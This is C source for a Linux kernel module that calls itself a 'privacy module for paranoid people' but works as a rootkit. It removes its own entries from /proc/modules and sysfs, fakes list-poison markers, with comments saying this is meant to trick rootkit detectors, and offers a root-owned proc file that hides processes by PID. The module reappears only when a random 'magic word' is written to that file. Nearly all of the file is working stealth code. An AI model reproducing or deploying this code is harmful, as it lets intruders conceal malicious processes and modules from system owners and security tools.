/**
 * Written by hash <carloslack@gmail.com>
 * Copyright (c) 2020 Carlos Carvalho
 *
 * Kernel version <= 5.5.0
 */
#include <linux/export.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/version.h>
#include <linux/moduleparam.h>
#include <linux/delay.h>
#include <linux/kthread.h>
#include <linux/slab.h>
#include <linux/proc_fs.h>
#include <linux/fs.h>
#include <linux/seq_file.h>
#include <linux/uaccess.h>
#include <linux/kobject.h>
#include <linux/sysfs.h>
#include <linux/device.h>
#include <linux/cdev.h>
#include <linux/kref.h>

#include "kernel_addr.h"
#include "randbytes.h"
#include "regs.h"

#define MAX_PROCFS_SIZE 64
#define MAX_MAGIC_WORD_SIZE 16
#ifndef MODNAME
#pragma message "Missing \'MODNAME\' compilation directive. See Makefile."
#endif
#ifndef PROCNAME
#error "Missing \'PROCNAME\' compilation directive. See Makefile."
#endif


extern void hide_task_by_pid(pid_t pid);
extern void ntsh_list_saved_tasks(void);
extern void ntsh_data_cleanup(void);

static struct proc_dir_entry *ntshProcFileEntry;
struct __lkmmod_t{ struct module *this_mod; };
static char *magic_word;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,5,0)
#pragma message "!! Warning: Unsupported kernel version GOOD LUCK WITH THAT! !!"
#endif

#define NTSH_DECLARE_MOD()                                           \
    MODULE_LICENSE("GPL");                                            \
    MODULE_AUTHOR("Carlos Carvalho");                                 \
    MODULE_DESCRIPTION("privacy module for paranoid people");

static struct list_head *mod_list;
static const struct __lkmmod_t lkmmod = {
    .this_mod = THIS_MODULE,
};

/*
 * kernel structures so the compiler
 * can know about sizes and data types
 */

// kernel/params.c
struct param_attribute
{
    struct module_attribute mattr;
    const struct kernel_param *param;
};

struct module_param_attrs
{
    unsigned int num;
    struct attribute_group grp;
    struct param_attribute attrs[0];
};

// kernel/module.c
struct module_sect_attr {
    struct module_attribute mattr;
    char *name;
    unsigned long address;
};
struct module_sect_attrs {
    struct attribute_group grp;
    unsigned int nsections;
    struct module_sect_attr attrs[0];
};

/*
 * sysfs restoration helpers.
 * Mostly copycat from the kernel with
 * slightly modifications to handle only a subset
 * of sysfs files
 */
static ssize_t show_refcnt(struct module_attribute *mattr,
        struct module_kobject *mk, char *buffer){
    return sprintf(buffer, "%i\n", module_refcount(mk->mod));
}
static struct module_attribute modinfo_refcnt =
    __ATTR(refcnt, 0444, show_refcnt, NULL);

static struct module_attribute *modinfo_attrs[] = {
    &modinfo_refcnt,
    NULL,
};

static void module_remove_modinfo_attrs(struct module *mod)
{
    struct module_attribute *attr;

    attr = &mod->modinfo_attrs[0];
    if (attr && attr->attr.name) {
        sysfs_remove_file(&mod->mkobj.kobj, &attr->attr);
        if (attr->free)
            attr->free(mod);
    }
    kfree(mod->modinfo_attrs);
}

static int module_add_modinfo_attrs(struct module *mod)
{
    struct module_attribute *attr;
    struct module_attribute *temp_attr;
    int error = 0;

    mod->modinfo_attrs = kzalloc((sizeof(struct module_attribute) *
                (ARRAY_SIZE(modinfo_attrs) + 1)),
            GFP_KERNEL);
    if (!mod->modinfo_attrs)
        return -ENOMEM;

    temp_attr = mod->modinfo_attrs;
    attr = modinfo_attrs[0];
    if (!attr->test || attr->test(mod)) {
        memcpy(temp_attr, attr, sizeof(*temp_attr));
        sysfs_attr_init(&temp_attr->attr);
        error = sysfs_create_file(&mod->mkobj.kobj,
                &temp_attr->attr);
        if (error)
            goto error_out;
    }

    return 0;

error_out:
    module_remove_modinfo_attrs(mod);
    return error;
}

/*
 * Remove the module entries
 * in /proc/modules and /sys/module/<MODNAME>
 * Also backup references needed for
 * ntsh_unhide_mod()
 */
struct rmmod_controller {
    struct kobject *parent;
    struct module_sect_attrs *attrs;
};
static struct rmmod_controller rmmod_ctrl;
static DEFINE_MUTEX(generic_mutex);

static inline void ntsh_list_del(struct list_head *prev, struct list_head *next)
{
    next->prev = prev;
    prev->next = next;
}

static void ntsh_hide_mod(void) {
    struct list_head this_list;

    if (NULL != mod_list)
        return;
    /*
     *  sysfs looks more and less
     *  like this, before removal:
     *
     *  /sys/module/<MODNAME>/
     *  ├── coresize
     *  ├── holders
     *  ├── initsize
     *  ├── initstate
     *  ├── notes
     *  ├── refcnt
     *  ├── sections
     *  │   ├── __bug_table
     *  │   └── __mcount_loc
     *  ├── srcversion
     *  ├── taint
     *  └── uevent
     */

    // Backup and remove this module from /proc/modules
    this_list = lkmmod.this_mod->list;
    mod_list = this_list.prev;
    mutex_lock(&generic_mutex);

    /**
     * We bypass original list_del()
     */
    ntsh_list_del(this_list.prev, this_list.next);

    /**
     * Swap LIST_POISON in order to trick
     * some rk detectors that will look for
     * the markers set by list_del()
     *
     * It should be OK as long as you don't run
     * list debug on this one (lib/list_debug.c)
     */
    this_list.next = (struct list_head*)LIST_POISON2;
    this_list.prev = (struct list_head*)LIST_POISON1;

    mutex_unlock(&generic_mutex);

    // Backup and remove this module from sysfs
    rmmod_ctrl.attrs = lkmmod.this_mod->sect_attrs;
    rmmod_ctrl.parent = lkmmod.this_mod->mkobj.kobj.parent;
    kobject_del(lkmmod.this_mod->holders_dir->parent);

    /**
     * Again mess with the known marker set by
     * kobject_del()
     */
    lkmmod.this_mod->holders_dir->parent->state_in_sysfs = 1;
}

/*
 * Restore the module entries in
 * /proc/modules and /sys/module/<module>/
 * After this function is called the best next
 * thing to do is to rmmod the module.
 */
static void ntsh_unhide_mod(void) {
    int err;
    struct kobject *kobj;

    if (!mod_list)
        return;

    /*
     * sysfs is tied inherently to kernel objects, here
     * we restore the bare minimum of sysfs entries
     * that will be needed when rmmod comes
     *
     * sysfs will look like this
     * after restoration:
     *
     * /sys/module/<MODNAME>/
     * ├── holders
     * ├── refcnt
     * └── sections
     *   └── __mcount_loc
     */

     // MODNAME is the parent kernel object
    err = kobject_add(&(lkmmod.this_mod->mkobj.kobj), rmmod_ctrl.parent, "%s", MODNAME);
    if (err)
        goto out_put_kobj;

    // holders parent is this module's object
    kobj = kobject_create_and_add("holders", &(lkmmod.this_mod->mkobj.kobj));
    if (!kobj)
        goto out_put_kobj;

    lkmmod.this_mod->holders_dir = kobj;

    // Create sysfs representation of kernel objects
    err = sysfs_create_group(&(lkmmod.this_mod->mkobj.kobj), &rmmod_ctrl.attrs->grp);
    if (err)
        goto out_put_kobj;

    // Setup attributes
    err = module_add_modinfo_attrs(lkmmod.this_mod);
    if (err)
        goto out_attrs;

    // Restore /proc/module entry
    mutex_lock(&generic_mutex);

    list_add(&(lkmmod.this_mod->list), mod_list);
    mutex_unlock(&generic_mutex);
    goto out_put_kobj;

out_attrs:
    // Rewind attributes
    if (lkmmod.this_mod->mkobj.mp) {
        sysfs_remove_group(&(lkmmod.this_mod->mkobj.kobj), &lkmmod.this_mod->mkobj.mp->grp);
        if (lkmmod.this_mod->mkobj.mp)
            kfree(lkmmod.this_mod->mkobj.mp->grp.attrs);
        kfree(lkmmod.this_mod->mkobj.mp);
        lkmmod.this_mod->mkobj.mp = NULL;
    }

out_put_kobj:
    // Decrement refcount
    kobject_put(&(lkmmod.this_mod->mkobj.kobj));
    mod_list = NULL;
}
NTSH_DECLARE_MOD();

static char* get_unhide_magic_word(void) {
    if(!magic_word)
        magic_word = ntsh_get_random_bytes(MAX_MAGIC_WORD_SIZE);

    /* magic_word must be freed later */
    return magic_word;
}

static int proc_dummy_show(struct seq_file *seq, void *data) {
    seq_printf(seq, "0\n");
    return 0;
}

static int open_cb(struct inode *ino, struct file *fptr) {
    return single_open(fptr, proc_dummy_show, NULL);
}

static ssize_t write_cb(struct file *fptr, const char __user *user,
        size_t size, loff_t *offset) {
    char buf[MAX_PROCFS_SIZE+1];
    unsigned long bufsiz = 0;
    static unsigned int op_lock;
    pid_t pid;
    memset(buf, 0, MAX_PROCFS_SIZE+1);

    bufsiz = size < MAX_PROCFS_SIZE ? size : MAX_PROCFS_SIZE;

    if (copy_from_user(buf, user, bufsiz))
        goto efault_error;

    pid = (pid_t)simple_strtol((const char*)buf, NULL, 10);
    if(pid > 1)
        hide_task_by_pid(pid);
    else {
        size_t len = strlen(buf) - 1;
        if(!len)
            goto leave;

        if (buf[len] == '\n')
            buf[len] = '\0';

        if(!strcmp(buf, "hide") && !op_lock) {
            static unsigned int msg_lock = 0;
            if(!msg_lock) {
                msg_lock = 1;
                printk(KERN_INFO "Your module \'unhide\' magic word is: '%s'\n", magic_word);
            }
            op_lock = 1;
            ntsh_hide_mod();
        } else if(!strcmp(buf, magic_word) && op_lock) {
            op_lock = 0;
            ntsh_unhide_mod();
        } else if(!strcmp(buf, "list"))
            ntsh_list_saved_tasks();
    }
leave:
    return size;
efault_error:
    return -EFAULT;
}

/**
 * proc file callbacks and defs
 */
static const struct file_operations proc_file_fops = {
    .owner =   THIS_MODULE,
    .open  =   open_cb,
    .read  =   seq_read,
    .release = seq_release,
    .write =   write_cb,
};

static void do_remove_proc(void) {
    if(ntshProcFileEntry) {
#if LINUX_VERSION_CODE < KERNEL_VERSION(3,9,0)
        remove_proc_entry(PROCNAME, NULL);
#else
        proc_remove(ntshProcFileEntry);
#endif
    }
}

static int __init ntsh_init(void) {
    int lock = 0;
    struct kernel_syscalls *ksys;
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3,5,0)
    kuid_t kuid;
    kgid_t kgid;
#endif

    kall_load_addr(); /* load kallsyms addresses */
    if(!k_attach_pid || !k_vfs_rmdir /* XXX: unused for now, let's see how this will play out */)
        goto addr_error;

    if(!get_unhide_magic_word())
        goto magic_word_error;

    //XXX unused still, same as k_vfs_rmdir
    ksys = kall_syscall_table_load();

try_reload:
    ntshProcFileEntry = proc_create(PROCNAME, S_IRUSR | S_IWUSR, NULL, &proc_file_fops);
    if(lock && !ntshProcFileEntry)
        goto proc_file_error;
    if(!lock) {
        if(!ntshProcFileEntry) {
            lock = 1;
            do_remove_proc();
            goto try_reload;
        }
    }

    /* set proc file maximum size & user as root */
#if LINUX_VERSION_CODE < KERNEL_VERSION(3,9,0)
    ntshProcFileEntry->size = MAX_PROCFS_SIZE;
    ntshProcFileEntry->uid = 0;
    ntshProcFileEntry->gid = 0;
#else
    proc_set_size(ntshProcFileEntry, MAX_PROCFS_SIZE);
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3,5,0)
    kuid.val = 0;
    kgid.val = 0;
    proc_set_user(ntshProcFileEntry, kuid, kgid);
#else
    proc_set_user(ntshProcFileEntry, 0, 0);
#endif
#endif

    goto leave;
proc_file_error:
    printk(KERN_ERR "Could not create proc file.\n");
    goto leave;
addr_error:
    printk(KERN_ERR "Could not get kernel function address, proc file not created.\n");
    goto leave;
magic_word_error:
    printk(KERN_ERR "Could not load magic word. proc file not created\n");
leave:
    printk(KERN_INFO "%s loaded.\n", MODNAME);
    return 0;
}

static void __exit ntsh_cleanup(void) {
    if(magic_word != NULL)
        kfree(magic_word);
    ntsh_data_cleanup();
    do_remove_proc();
    printk(KERN_INFO "ntsh unloaded.\n");
}

module_init(ntsh_init);
module_exit(ntsh_cleanup);
